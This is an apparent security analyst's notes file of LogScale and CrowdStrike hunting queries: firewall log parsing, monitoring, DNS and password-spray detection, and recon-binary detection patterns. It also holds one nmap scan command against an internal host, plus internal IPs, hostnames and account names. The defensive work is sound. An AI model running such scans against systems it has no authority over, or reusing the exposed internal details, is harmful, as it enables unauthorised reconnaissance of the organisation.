@@ -1,0 +1,3260 @@
+---
+aliases:
+tags:
+source:
+desc:
+references:
+title:
+templateVersion: 1.1
+---
+# Logscale
+
+## timechart
+```s
+#repo=ucq-palofirewall
+| timechart(series=domain, span=1h)
+```
+
+
+## matching data in file
+```s
+match(file="PaloIngestionRulesWhichShouldBeIgnored.csv", column=RuleName, field=RuleName, include=[])
+| timechart()
+```
+
+## bucket 
+```s
+#repo=ucq-palofirewall
+//| timechart(series=domain, function=count(User), span=1d, limit=50)
+| bucket(field=Type, function=count(), span=1d, limit=500)
+| parseTimestamp(field=_bucket,format=millis, as=mills)
+| formatTime(format="%F", as="readabledate", field=mills)       // format it https://library.humio.com/data-analysis/functions-formattime.html
+| table(fields=[mills, Type, _count], limit=500)
+```
+
+## count commas in rawstring
+```s
+#repo=ucq-palofirewall
+| replace(regex="[^,]", field=@rawstring, as=commasonly)    //replace all the characters except commas
+| length(field=commasonly, as=lencommasonly)                // get the length of the commasonly field
+| groupBy(field=[Type,domain,lencommasonly])
+```
+
+## search for *.ru and *.cn domain names being requested
+```s
+in(fqdn,values=["*.ru", "*.cn"])
+| groupby(field=[fqdn,srcipaddress,protocol])
+```
+
+
+## limit number of results using sort
+```s
+in(fqdn,values=["*.ru", "*.cn"])
+| groupby(field=[fqdn,resolvedhostname], function=count()) | sort(field=_count, limit=20)
+```
+
+## get a count of all the repos
+```
+groupby(field=#repo)
+```
+
+## time chart of count of records in repos for every 5 minutes
+```s
+timeChart(span=15m, function=count(), series=#repo)
+```
+
+## custom output using case
+```s
+astein OR adm_astein
+| case { 	
+	#repo = ucq-palofirewall | format("%s from %s:%s to %s:%s",field=[Type,SourceIP,SourcePort, DestinationIP, DestinationPort],as=output) ; 
+	#repo = ucq-ad | splitString(field=@rawstring, by = "\n") | format("eventid=%s | action=%s", field=[#windows.EventID , _splitstring[0]], as=output);
+    "BOOO NOT HANDLED"
+}
+| table([@timestamp, #repo, output])
+```
+
+## worldmap 
+tick the live view to refresh results automatically
+```s
+#repo = "ucq-palofirewall"
+| worldMap(ip=DestinationIP)
+```
+
+## find firewall sources that have not sent traffic for a period of time
+```s
+createEvents([
+    "firewallsource=SHOULD_ALWAYS_BE_DISPLAYED",            // THIS IS A TEST CASE AND SHOULD ALWAYS BE DISPLAYED
+    "firewallsource=DC1-FW-MGMTSVR",            "firewallsource=SAW-CORE-FW-P003",
+    "firewallsource=SAW-CORE-FW-P004",          "firewallsource=SSHB-CORE-FW-P001",
+    "firewallsource=SSHB-CORE-FW-P002",         "firewallsource=TWH-CORE-FW-P003",
+    "firewallsource=TWH-CORE-FW-P004",          "firewallsource=UCQ-DC1-FW-EXT-P003",
+    "firewallsource=UCQ-DC1-FW-EXT-P004",       "firewallsource=UCQ-DC1-FW-INT-P003",
+    "firewallsource=UCQ-DC1-FW-INT-P004",       "firewallsource=TSCPH-CORE-FW-P003",
+    "firewallsource=TSCPH-CORE-FW-P004",        //"firewallsource=UCH-FW-MGMTSVR",
+    "firewallsource=UCQ-DC1-FW-INT-P005",       "firewallsource=UCQ-DC1-FW-INT-P006",
+    "firewallsource=UCQ-DC2-FW-INT-P003",       "firewallsource=UCQ-DC2-FW-INT-P004",
+    "firewallsource=UCQ-DC2-FW-INT-P005",       "firewallsource=UCQ-DC2-FW-INT-P006",
+    "firewallsource=UCQ-DC2-FW-EXT-P003",       "firewallsource=UCQ-DC2-FW-EXT-P004"
+]) 
+| kvParse()
+| join(
+    query={ groupBy([domain]) },
+    field=firewallsource,                           //pk in primary query
+    key=domain,                                 	//pk in sub query
+    include=[domain, _count],    
+    mode=left
+)
+| table(fields=[firewallsource, _count])
+| _count != *
+
+```
+![Alt text](../media/logscale/image-4.png)
+
+
+
+
+
+
+
+### Upgrade of custom logs from Palo
+
+#### Current traffic format in palos
+```s
+$sender_sw_version,$receive_time,$serialnumber,$type,$app,$category,$rule,$src,$dst,$natsrc,$natdst,$sport,$dport,$natsport,$natdport,$proto,$action
+```
+
+#### New traffic format for palos
+```s
+$sender_sw_version,$receive_time,$serialnumber,$type,$app,$category,$rule,$src,$dst,$natsrc,$natdst,$sport,$dport,$natsport,$natdport,$proto,$action,$srcuser,$dstuser,$from,$to,$bytes,$bytes_sent,$bytes_received,$category_of_app,$subcategory_of_app,$start,$sessionid
+
+```
+
+#### Updated parser script
+``` s
+/*  20230905 AdamS This is the original rule put in place by SilasB
+    Type="TRAFFIC"
+      | parseCSV(csv_data, columns=[
+          _fu1, ReceiveTime, SerialNumber, Type, Application, Category, RuleName, SourceIP, DestinationIP, NATSourceIP, NATDestinationIP, SourcePort, DestinationPort, NATSourcePort, NATDestinationPort, Protocol, Action
+        ])
+      | parseTimestamp(field="ReceiveTime", format="yyyy/MM/dd HH:mm:ss", timezone="UTC") ; 
+ */
+//  20230905 AdamS New parsing rule for additional fields being added to the Palo custom log format.
+    Type="TRAFFIC"
+      | parseCSV(csv_data, columns=[
+          _fu1, ReceiveTime, SerialNumber, Type, Application, Category, RuleName, SourceIP, DestinationIP, NATSourceIP, NATDestinationIP, SourcePort, DestinationPort, NATSourcePort, NATDestinationPort, Protocol, Action, SourceUser, DestinationUser, SourceZone, DestinationZone, BytesTotal, BytesSent, BytesReceived, ApplicationCategory, ApplicationSubCategory, StartTime, SessionID
+        ])
+      | parseTimestamp(field="ReceiveTime", format="yyyy/MM/dd HH:mm:ss", timezone="UTC"); 
+```
+
+
+## count records
+```s
+| #repo!=unitingcare-queensland
+| bucket(function=count(), span=1d, limit=500)
+| parseTimestamp(field=_bucket,format=millis, as=mills)
+| formatTime(format="%F", as="readabledate", field=mills)   
+```
+
+
+## AD activity for a user
+```s
+#repo = "ucq-ad"                                                        //ad repo
+| in(field=@rawstring, values=["*twhmlcl*"], ignoreCase=true)           //only these account names
+| ! in(field=@rawstring, values=["*twhmlcltechusr*", "*twhmlclmgr*"])   //exclude these accounts
+| splitString(field=@rawstring, by = "\n")                              //split the rawstring field on newlines
+| formatTime(format="%F", as="readabledate", field=@timestamp)
+//| formatTime(format="%Y/%m/%d %H:%M:%S ", as="readabledate", field=@timestamp, timezone="Australia/Brisbane")
+```
+
+
+## format numbers, format to 2 decimal points
+```s
+| unit:convert(_sum, as="MB", to="M")
+| format("%.2f", field=MB, as=MB)
+```
+
+## split rawstring by newline
+```s
+| splitString(field=@rawstring, by = "\n")                                  //split the rawstring field on newlines 
+| "_splitstring[0]" = "A member was removed*"                               //first field must 
+```
+
+
+## palo ingestion nasty validator
+```s
+/*PALO NASTY VALIDATOR */
+| createEvents(["fieldname=SourceUser", "fieldname=DestinationUser", "fieldname=ApplicationCategory", "fieldname=ApplicationSubCategory", "fieldname=SourceZone", "fieldname=DestinationZone"])
+| kvParse()
+| join(query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC | SourceUser != "" | fieldname := "SourceUser"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left)
+| join(query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC | DestinationUser != "" | fieldname := "DestinationUser"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left)
+| join(query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC | ApplicationCategory != "" | fieldname := "ApplicationCategory"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left
+)
+| join(
+    query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC  | ApplicationSubCategory != "" | fieldname := "ApplicationSubCategory"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left
+)
+| join(
+    query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC | SourceZone != "" | fieldname := "SourceZone"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left
+)
+| join(
+    query = { 
+        #repo = ucq-palofirewall | Type = TRAFFIC | DestinationZone != "" | fieldname := "DestinationZone"
+        | groupBy(field=fieldname, function={selectLast(@timestamp)}) | age := now() - @timestamp| age > 3000000 | formatDuration(field=age, as=age)
+    }, include=[fieldname, age],    field=fieldname,    key=fieldname,    mode=left
+)
+| length(age) | _length > 0
+| table(fields=[fieldname, age])
+
+
+```
+
+## top 
+```s
+#repo = ucq-palofirewall
+| Type = TRAFFIC    
+| domain = "UCQ-DC*-FW-EXT-*"
+//| SourceUser != ""
+| dom := time:dayOfMonth(@timestamp)
+| top(field=[dom, SourceUser], limit=50, rest=others)
+
+```
+
+
+
+## monitor firewalls
+```s
+#repo = ucq-palofirewall
+// do we care which node it is coming from?
+| case {
+    domain = "UCQ-*-FW-EXT-*"   | domaingroup := "UCQ-FW-EXT";               
+    domain = "UCQ-*-FW-INT-*"   | domaingroup := "UCQ-FW-INT";
+    domain = "TWH-CORE-FW-*"    | domaingroup := "TWH-CORE-FW";
+    domain = "SAW-CORE-FW-*"    | domaingroup := "SAW-CORE-FW";
+    domain = "SSHB-CORE-FW-*"   | domaingroup := "SSHB-CORE-FW";
+    domain = "TSCPH-CORE-FW-*"  | domaingroup := "TSCPH-CORE-FW";
+    *                           | domaingroup := domain
+}
+| domain != "syslogtest.ps1"                        //exclude my test case
+//| !in(Type,values=["CONFIG", "SYSTEM"])            // do we need CONFIG or SYSTEM
+| groupBy(field=[domaingroup, Type], function={selectLast(@timestamp)}) // the last time we saw a record based on the fields
+| age := now() - @timestamp
+| age > 3000000 // 3000000 = 50 minutes in milliseconds
+| formatDuration(field=age, as=age)
+| rename(age, as="Time Since Seen")
+
+
+```
+
+
+## rich colors
+```
+| case {
+    Severity = critical     | icon:="🔴";
+    Severity = high         | icon:="🟠";
+    Severity = medium       | icon:="🟡";       //      🟣
+    Severity = low          | icon:="🟢";       //      ⚪
+    *                       | icon:="🔵";       //      ⚫
+}
+
+
+
+🟥
+U+1F7E5
+🟦
+U+1F7E6
+🟧
+U+1F7E7
+🟨
+U+1F7E8
+🟩
+U+1F7E9
+🟪
+U+1F7EA
+🟫
+U+1F7EB
+⬛
+U+2B1B
+⬜
+U+2B1C
+🔲
+U+1F532
+🔳
+
+
+```
+
+
+## format strings
+```s
+#repo = ucq-palofirewall
+// do we care which node it is coming from?
+| case {
+    domain = "UCQ-*-FW-EXT-*"   | domaingroup := "UCQ-FW-EXT";               
+    domain = "UCQ-*-FW-INT-*"   | domaingroup := "UCQ-FW-INT";
+    domain = "TWH-CORE-FW-*"    | domaingroup := "TWH-CORE-FW";
+    domain = "SAW-CORE-FW-*"    | domaingroup := "SAW-CORE-FW";
+    domain = "SSHB-CORE-FW-*"   | domaingroup := "SSHB-CORE-FW";
+    domain = "TSCPH-CORE-FW-*"  | domaingroup := "TSCPH-CORE-FW";
+    *                           | domaingroup := domain
+}
+| domain != "syslogtest.ps1"                        //exclude my test case
+| !in(Type,values=["CONFIG", "SYSTEM"])            // do we need CONFIG or SYSTEM
+| groupBy(field=[domaingroup, Type], function={selectLast(@timestamp)}) // the last time we saw a record based on the fields
+| age := now() - @timestamp
+// to see all domains, comment out the below line
+//| age > 3000000 // 3000000 = 50 minutes in milliseconds
+| case {
+    age > 3000000 | ageicon := "🔴";
+    * | ageicon:="🟢"
+}
+| format(format="%s%s", field=[ageicon,domaingroup], as=domaingroup)
+| formatDuration(field=age, as=age)
+| rename(age, as="Time Since Seen")
+| table(fields=[domaingroup, Type, @timestamp, "Time Since Seen"])
+
+```
+
+
+
+## filter records in parser 
+```sh 
+      | case {
+         domain="UCQ-*-FW-INT-*" | match(file="RulesWhichShouldBeIgnored.csv", column=RuleName, field=RuleName, include=[])  | ignoredRuleName:=true;
+          * | ignoredRuleName:=false
+      }
+```
+
+
+## cidr query
+```sh
+| #repo = ucq-palofirewall
+| cidr(SourceIP, subnet=["10.0.0.0/8"])
+
+// CERNER
+| SourceZone = Prod_Transit | DestinationZone = Cerner_VPN | cidr(DestinationIP, subnet=["68.65.229.0/24", "68.65.229.0/24", "68.65.229.0/24", "68.65.228.0/24","159.140.120.0/24","159.140.110.0/27"]) 
+
+// INTERNET
+//| SourceZone = Prod_Transit | DestinationZone = External_Prod
+
+
+| timeChart(function=[sum(BytesReceived, as=SumReceived), sum(BytesSent, as=SumSent)])
+
+```
+
+
+## searching dns records
+```
+| #repo = ucq-dns
+//| !in(field=fqdn, values=["*.ucq.com.au", "*.uhc.com.au", "*.uhc.uc.com.au", "*.int.ucq.com.au", "*domainkey*", "*.sophosxl.net", "*.arpa"], ignoreCase=true)
+//| in(field=fqdn, values=["*.ru", "*.cn"], ignoreCase=true)            // fqdn ends in ru (russia) or cn (china)
+//| length:=length(fqdn) | length > 100 | groupby(fqdn)                 // really long fqdn
+//| groupby(field=questype)                                             // strange questypes
+//| groupby(field=[srcipaddress, fqdn])                                 // looking for sources making multiple requests to the same domain. [ 86400 seconds in day ]
+//| groupby(field=[fqdn], function=count(srcipaddress, distinct=true))  // number of machines connecting to the same fqdn 
+//| in(field=fqdn, values=["*.top","*.gq","*.ga","*.cf","*.cn","*.tk","*.zw","*.bd","*.ke","*.am","*.date","*.pw","*.quest","*.cd","*.bid","*.ga","*.xyz","*.cf","*.tk","*.ml", "*.cyou"], ignoreCase=true)         // malicious, phishing, malware
+//| groupby(fqdn)
+//| in(field=questype, values=["TXT*", "NULL", "CNAME"])                //popular dns tunneling records
+
+```
+
+
+
+
+
+
+
+## JOIN TO CROWDSTRIKE TO GET COMPUTERNAME
+```sh
+/* 
+JOIN TO CROWDSTRIKE TO GET COMPUTERNAME
+*/
+#repo = ucq-palofirewall
+| in(field=Category, values=["hacking", "malicious", "malware", "phishing", "scanning-activity"])
+
+
+/* JOIN to CROWDSTRIKE BASED ON IP ADDRESS */
+| join(
+    query={ 
+        kvParse()
+        | UserName=* // wildcard means must contain a value
+        | Username!="*$" // Managed service accounts are identified by ending in a dollar sign ($) so exclude them
+    },
+    field=SourceIP,                                 //pk in outer query
+    key=LocalAddressIP4,                            //pk in this query
+    include=[ComputerName, UserName],    
+    mode=left,
+    max=1,
+    repo="unitingcare-queensland"
+)
+| table(fields=[@timestamp, ComputerName, SourceIP, SourceUser, UserName, Category, domain, RuleName])
+```
+
+
+
+
+
+
+
+
+
+# Hospital appid upgrade
+
+
+
+
+| top(desc, limit=2, percent=true)
+| format("%.2f", field=percent, as=percent)
+| desc = "AppIds"
+| select(fields=[desc,percent])
+
+
+
+
+## NMAP scan from cyber01 to work laptop
+https://ucareqld.logscale.us-2.crowdstrike.com/ucqv-overview/search?end=1711327020000&live=false&query=%2F%2Fnmap%20-sC%20-sV%20-oA%20c%3A%5Ctemp%5Cnmapscan%2010.14.212.95%0A%23repo%3Ducq-palofirewall%0A%7C%20SourceIP%20%3D%20%2010.14.12.90%20%20%20%20%20%20%20%20%20%20%20%2F%2FUCQ-CYBER-P001%0A%7C%20DestinationIP%20%3D%2010.14.212.95%20%20%20%20%20%20%2F%2Fucl-gw5hzh3.int.ucq.com.au&start=1711326840000&tz=Australia%2FBrisbane
+
+//nmap -sC -sV -oA c:\temp\nmapscan 10.14.212.95
+#repo=ucq-palofirewall
+| SourceIP =  10.14.12.90           //UCQ-CYBER-P001
+| DestinationIP = 10.14.212.95      //ucl-gw5hzh3.int.ucq.com.au
+
+2024-03-25 10:34:00.000 - 2024-0325 10:37:00.000
+
+
+
+
+# bucket with timestamp converted
+```s
+#repo=ucq-palofirewall
+| case {
+    domain = "TSCPH-CORE-FW-*"      | domaingroup := "TSCPH [Buderim]"    | match(file="appIdRuleNamesBuderim.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);                //BUDERIM
+    domain = "SSHB-CORE-FW-*"       | domaingroup := "SSHB [StStephens]"     | match(file="appIdRuleNamesStStephens.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);           //ST STEPHENS
+    domain = "TWH-CORE-FW-*"        | domaingroup := "TWH [Wesley]"      | match(file="appIdRuleNamesWesley.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);               //WESLEY
+    domain = "SAW-CORE-FW-*"        | domaingroup := "SAW [StAndrews]"      | match(file="appIdRuleNamesStAndrews.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);            //ST ANDREWS
+
+    *                               | domaingroup := "excluded"         //catch all
+}
+| domaingroup = "SSHB [StStephens]"
+| case {
+    csvDesc = "Used"            | csvDesc:="Existing RuleName";
+    csvDesc = "Partially Used"  | csvDesc:="Existing RuleName";
+    csvDesc = "New Rule"        | csvDesc:="AppId";
+}
+| bucket(2m, field=[RuleName, csvDesc, Application, ApplicationCategory, ApplicationSubCategory], limit=500, function=[collect([SourceIP, DestinationIP], separator=","), count(as=_count)])
+| time := formatTime("%Y/%m/%d %H:%M:%S", field=_bucket, timezone="Australia/Brisbane") 
+| select(fields=[time,RuleName, _count, csvDesc, Application, ApplicationCategory, ApplicationSubCategory])
+
+```
+
+
+
+# NOT INTERNAL IP RANGES
+
+```sh
+| #repo = "ucq-palofirewall"
+| RuleName="ENP-UNMANAGED_access_in_37"
+| !cidr(field=DestinationIP, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])  
+| groupby(field=[SourceIP, DestinationIP], limit=max, function=[collect(Application)])
+| unit:convert(TBR, as="MBR", to="M") | format("%.2f", field=MBR, as=TotalMBReceived)
+
+```
+
+
+
+
+# crowdstrike
+add username to results
+`| join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left)`
+
+add computer name to results
+`| match(file="fdr_aidmaster.csv", field=aid, include=ComputerName, ignoreCase=true, strict=false)`
+
+
+
+https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Leveraging%20the%20aidmaster%20repo.md 
+`
+#repo=sensor_metadata #data_source_name=aidmaster
+| groupBy([cid, aid], function=([selectFromMax(field="@timestamp", include=[AgentLoadFlags, AgentLocalTime, AgentTimeOffset, AgentVersion, BiosManufacturer, BiosVersion, ChassisType, City, ComputerName, ConfigBuild, ConfigIDBuild, Continent, Country, FalconGroupingTags, FirstSeen, HostHiddenStatus, MachineDomain, OU, PointerSize, ProductType, SensorGroupingTags, ServicePackMajor, SiteName, SystemManufacturer, SystemProductName, @timezone, Timezone, Version, aid, aip, cid, event_platform])]))
+| lastSeen:=@timestamp
+| formatTime(format="%F %T", as="lastSeen", field=lastSeen)
+| timeDelta:=now()-@timestamp
+| timeDeltaDays:=timeDelta/1000/60/60/24
+| round(timeDeltaDays)
+  
+// Edit this line to set your "days since last seen" treshold
+//| timeDeltaDays<4
+  
+| ipLocation(aip)
+| drop([aip.lat, aip.lon, timeDelta, @timestamp])
+`
+
+
+
+## split ioc
+`
+client_ip:="15.235.66.162"
+|ioc:lookup(field=[client_ip],type="ip_address",confidenceThreshold=unverified)
+| split("ioc")
+`
+
+
+```
+/*
+| join({
+    join({
+        //start inside out
+        #event_simpleName = SensorTampering 
+        | triggerEvent := #event_simpleName 
+        | triggerCmd := SourceCommandLine
+    }, field=TargetProcessId, key=SourceProcessId, include=[triggerEvent, triggerCmd])
+}, field=TargetProcessId, key=ParentProcessId, include=[triggerEvent, triggerCmd])
+| select([@timestamp,ComputerName,Username,triggerEvent,triggerCmd,CommandLine])
+//| !CommandLine = "sh -c \\u000a        /usr/bin/pkill -HUP falcon-sensor\\u000a logrotate_script /var/log/falcon-sensor.log " //log rotation, exclude from alert
+*/
+// groupBy([#event_simpleName])
+//groupby([Tactic, #event_simpleName])
+//#event_simpleName = ProcessRollup2 
+
+//ContextProcessId = UPID of process originating this event. 
+// #event_simpleName = InstalledUpdates | RebootRequired = 1 | select([ComputerName, RebootRequired, InstalledUpdateIds])
+// #event_simpleName = SuspiciousDnsRequest | join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left) | select([ComputerName, Username, DomainName])
+// #event_simpleName=UserLogon | //password lastset > policy
+// #event_simpleName = ScreenshotTakenEtw | groupBy([ComputerName,Username])
+// #event_simpleName = SmbServerV1AuditEtw | groupBy(field=[ComputerName], function=[collect([SmbClientName]), count()])       //smbv1 sweep?
+//  #event_simpleName = *File* | groupBy([#event_simpleName])
+// RansomwareOpenFile 
+// #event_simpleName = ScriptControlDetectInfo
+#event_simpleName = ActiveDirectoryAuthentication
+```
+
+
+
+# password spray
+```
+#repo=ucq-palofirewall|Type=GLOBALPROTECT|ipLocation(field=PublicIP,as=location)|location.country!="AU"|Status=failure 
+| groupBy([PublicIP, Status], function=[count(), collect([SourceUser], separator=", ")])
+
+```
+
+
+
+# enriching results for
+```
+#repo=ucq-palofirewall
+| ApplicationSubCategory = /artificial-intelligence/i
+| groupBy([SourceIP], function=[count(as=HitCount)])
+| join(query={ #event_simpleName = UserLogon }, field=SourceIP, key=LocalAddressIP4, mode=inner, include=[aid])
+| groupBy([SourceIP, HitCount], function=[count(), collect([aid])])
+| match(file="fdr_aidmaster.csv", field=aid, include=ComputerName, ignoreCase=true, strict=false)
+| join({#event_simpleName=UserLogon}, field=aid, include=UserName, mode=left)
+
+```
+
+
+
+
+
+
+# add domain sids information to query results
+
+get domain sids and output to file
+```
+$domains = @("int.ucq.com.au", "lccq.org.au", "qld.bluecare.org.au", "uhc.uc.com.au"); foreach ($domain in $domains){get-adgroup -filter * -server $domain -properties * | Select-Object -Property @{Name='Domain';Expression={$domain}}, ObjectClass, DistinguishedName, SID, SamAccountName, Description | Export-Csv -Path c:\temp\domainsids.csv -append -NoTypeInformation}
+```
+upload to logscale
+
+```
+#repo=ucq-ad
+| #windows.EventID = 4627           // Group membership information.
+//ENSURE YOU ONLY GET ONE RESULT!
+| @collect.id = "56847e61-0402-4e75-bf7c-f5be48056cb1"  | /tshi1/i  | @collect.timestamp = 1715145538142
+//THEN MATCH
+| regex(field=@rawstring, regex="{(?<SID>[^\\{*}]*)}", repeat=true)
+| match(file="domainsids.csv", field="SID")
+| groupby(field=[@collect.id], function=[collect([SamAccountName])])
+
+```
+
+
+
+
+https://ucareqld.logscale.us-2.crowdstrike.com/ucqv-overview/search?tz=Australia/Brisbane&query=%23repo%3Ducq-ad%0A%7C+%23windows.EventID+%3D+4627+++++++++++//+Group+membership+information.%0A//%7C+@collect.id+%3D+%2232b89c81-f15a-4195-af4f-e916a16bc3c0%22%0A%7C+/adm_astein/i%0A%7C+@collect.timestamp+%3D+1713164969166%0A//%7C+/QLD.BLUECARE.ORG.AU/i%0A//%7C+@collect.timestamp+%3D+1715230492400%0A%7C+regex(field%3D@rawstring,+regex%3D%22%7B(?%3CSID%3E%5B%5E%5C%5C%7B*%7D%5D*)%7D%22,+repeat%3Dtrue)%0A//%7C+match(file%3D%22sids.csv%22,+field%3D%22SID%22)%0A//%7C+groupby(field%3D%5B@collect.id%5D,+function%3D%5Bcollect(%5BSamAccountName%5D)%5D)%0A%7C+select(SID)%0A%0A&live=false&end=1713191623850&start=1713133582282
+
+
+https://ucareqld.logscale.us-2.crowdstrike.com/ucqv-overview/search?live=false&query=%23repo%3Ducq-palofirewall%7CType%3DGLOBALPROTECT%7CipLocation(field%3DPublicIP%2Cas%3Dlocation)%7Clocation.country!%3D%22AU%22%7CStatus%3Dfailure%0A%7C%20PublicIP%20!%3D%200.0.0.0%0A%7C%20groupBy(%5BPublicIP%5D%2C%20function%3D%5Bcount(as%3DCount)%2C%20count(field%3DSourceUser%2C%20as%3DSourceUserCount%2C%20distinct%3Dtrue)%5D)%0A%7C%20sort(field%3DCount)%0A%7C%20Count%20%3E%20100&start=1d&tz=Australia%2FBrisbane
+
+
+https://ucareqld.logscale.us-2.crowdstrike.com/ucqv-overview/search?live=false&query=%2F*%20%0A%20%20%20%20Every%20Falcon%20sensor%20is%20given%20a%20unique%20identifier%20called%20an%20aid.%20Every%20event%20emitted%20from%20the%20Falcon%20Sensor%20contains%20this%20field%2C%20and%20should%20be%20considered%20the%20primary%20key%20for%20looking%20up%20events%20from%20a%20given%20sensor%2Fmachine.%0A%20%20%20%20users%20who%20have%20logged%20on%0A%20%20%20%20%23event_simpleName%3DUserLogon%20event_platform%3DMac%0A*%2F%0A%2F%2F%20%23event_simpleName%3DSuspiciousDnsRequest%0A%2F%2F%20%7C%20groupBy(aid%2C%20function%3Dcollect(DomainName)%2C%20limit%3Dmax)%0A%0A%23event_simpleName%3DProcessRollup2%20%0A%7C%20!in(UserName%2C%20values%3D%5B%22*%24%22%2C%20%22SYSTEM%22%5D)%0A%7C%20ImageFileName%3D%2F(%5C%2F%7C%5C%5C)(%3F%3CFileName%3E%5Cw*%5C.%3F%5Cw*)%24%2F%0A%7C%20FileName%20%3D%20%2F%5E(net%7Cipconfig%7Cwhoami%7Cquser%7Cping%7Cnetstat%7Ctasklist%7Chostname%7Cat)%5C.exe%24%2Fi%0A%7C%20case%20%7B%0A%20%20%20%20aid%3D*%20AND%20ComputerName!%3D*%0A%20%20%20%20%20%20%7C%20match(file%3D%22fdr_aidmaster.csv%22%2C%20field%3Daid%2C%20include%3DComputerName%2C%20ignoreCase%3Dtrue%2C%20strict%3Dtrue)%3B%0A%20%20%20%20*%20%7C%20default(field%3DComputerName%2C%20value%3DNotMatched)%3B%0A%20%20%7D%0A%7C%20table(%5Baid%2C%20UserName%2C%20ComputerName%2C%20ParentBaseFileName%2C%20ImageFileName%2C%20CommandLine%5D%2C%20limit%3D1000)%0A%0A%2F%2F%7C%20groupby(UserName)&start=2d&tz=Australia%2FBrisbane
+
+
+https://ucareqld.logscale.us-2.crowdstrike.com/ucqv-overview/search?live=false&query=%0A%23repo%3Ducq-palofirewall%0A%7C%20ApplicationSubCategory%20%3D%20%2Fartificial-intelligence%2Fi%0A%7C%20groupBy(%5BSourceIP%5D%2C%20function%3D%5Bcount(as%3DHitCount)%5D)%0A%7C%20join(query%3D%7B%0A%20%20%20%20%20%20%20%20%23event_simpleName%20%3D%20UserLogon%0A%20%20%20%20%7D%2C%20field%3DSourceIP%2C%20key%3DLocalAddressIP4%2C%20mode%3Dinner%2C%20include%3D%5Baid%5D)%0A%7C%20groupBy(%5BSourceIP%2C%20HitCount%5D%2C%20function%3D%5Bcount()%2C%20collect(%5Baid%5D)%5D)%0A%7C%20match(file%3D%22fdr_aidmaster.csv%22%2C%20field%3Daid%2C%20include%3DComputerName%2C%20ignoreCase%3Dtrue%2C%20strict%3Dfalse)%0A%7C%20join(%7B%23event_simpleName%3DUserLogon%7D%2C%20field%3Daid%2C%20include%3DUserName%2C%20mode%3Dleft)%0A&start=30d&tz=Australia%2FBrisbane
+
+
+
+
+# heatmap to show drop in count over time
+```
+
+#repo=ucq-palofirewall
+| case {
+    domain = "TSCPH-CORE-FW-*"      | domaingroup := "TSCPH [Buderim]"    | match(file="appIdRuleNamesBuderim.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);                //BUDERIM
+    domain = "SSHB-CORE-FW-*"       | domaingroup := "SSHB [StStephens]"     | match(file="appIdRuleNamesStStephens.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);           //ST STEPHENS
+    domain = "TWH-CORE-FW-*"        | domaingroup := "TWH [Wesley]"      | match(file="appIdRuleNamesWesley.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);               //WESLEY
+    domain = "SAW-CORE-FW-*"        | domaingroup := "SAW [StAndrews]"      | match(file="appIdRuleNamesStAndrews.csv", field=RuleName, column=csvRuleName, include=[csvRuleName,csvDesc]);            //ST ANDREWS
+
+    *                               | domaingroup := "excluded"         //catch all
+}
+| domaingroup = "SSHB [StStephens]"
+| case {
+    csvDesc = "Used"            | csvDesc:="Existing RuleName";
+    csvDesc = "Partially Used"  | csvDesc:="Existing RuleName";
+    csvDesc = "New Rule"        | csvDesc:="AppId";
+}
+
+
+///// MAGIC HERE
+| bucket(field=RuleName, minSpan=1m, limit=500)
+| parseTimestamp(field=_bucket,format=millis)
+| formatTime(format="%R", as="newtime", field=@timestamp, timezone="Australia/Brisbane")
+| formatTime("H:M", field=@timestamp, as=minute)
+| _count > 500
+
+```
+
+
+
+
+# match on two different fields, same .csv file
+```s
+#repo=ucq-palofirewall
+| domain like "UCQ-DC*-FW-EXT-*"
+| match(file="enrichIPs.csv", field="SourceIP", column="ip", mode="cidr", include=[name], strict=false)
+| rename(field=name, as="srcName")
+| select([RuleName, SourceIP, srcName, DestinationIP])   
+| match(file="enrichIPs.csv", field="DestinationIP", column="ip", mode="cidr", include=[name], strict=false)
+| rename(field=name, as="dstName")
+| select([RuleName, SourceIP, srcName, DestinationIP,dstName])  
+
+```
+
+
+# parentbasefilename
+```s
+#repo=unitingcare-queensland
+| #event_simpleName=ProcessRollup2
+| aid = a7aa650d77a64ef285258d3924840aa5    //lachy
+| ParentBaseFileName = /outlook|winword|excel/i
+| join({#event_simpleName=ProcessRollup2 | aid=aid}, field=[ContextProcessId], key=TargetProcessId, include=[FileName, CommandLine,ComputerName], mode=left)
+| select([@timestamp, refdomain, #event_simpleName, UserName, ParentBaseFileName, CommandLine])
+
+```
+
+
+
+
+
+# qryFirewallAverageMBytesPerDay
+![alt text](../media/logscale/image-5.png)
+```
+/* 
+query   :   qryFirewallAverageMBytesPerDay
+desc    :   calculates the average mb sent and recieved through the firewall for each day over 30 days
+input   :   none
+output  :   dayofweek, avgMBSent, avgMBReceived
+usage   :   
+*/
